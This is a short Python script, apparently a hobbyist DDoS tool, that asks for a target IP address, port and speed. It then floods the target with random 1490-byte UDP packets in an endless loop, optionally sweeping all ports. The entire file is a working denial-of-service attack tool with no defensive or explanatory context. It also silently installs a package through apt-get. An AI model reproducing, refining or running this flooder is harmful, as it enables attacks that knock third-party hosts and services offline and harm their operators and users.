import sys
import os
import time
import socket
import random
from colorama import Fore, Back, Style
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#Colour
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'
###################################################################################
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
###################################################################################
###################################################################################
# IMPORT MODULE
import os, sys, socket, threading, random
###################################################################################
# CLEAR
def clear():
	os.system('cls' if os.name=='nt' else 'clear')
###################################################################################

os.system("clear")
os.system("apt-get install -y figlet")
os.system("figlet DDos")
print (" ")
###################################################################################
# MAIN MENU 

ip = input("\033[94m╔═══\033[91m[ Please input IP ] •\n\033[94m╠══>\033[0m ")

port = int(input("\033[94m╠═══\033[91m[ Port enter 00000 ] •\n\033[94m╠══>\033[0m "))

speed = int(input("\033[94m╠═══\033[91m[ Attack speed (0-1000) ] •\n\033[94m╠══>\033[0m "))
clear()
print("\033[94m")
###################################################################################

sent = 0
if port == 00000:
     port = 1     
     while True:
          sock.sendto(bytes, (ip,port))
          sent = sent + 1
          port = port + 1
          print ("Has sent %s packet %s port %d"%(sent,ip,port))
          time.sleep((1000-speed)/2000)
          if port == 65535:
               port = 1
else:
     while True:
          sock.sendto(bytes, (ip,port))
          sent = sent + 1
          print ("Has sent %s packet %s port %d"%(sent,ip,port))
          time.sleep((1000-speed)/2000)
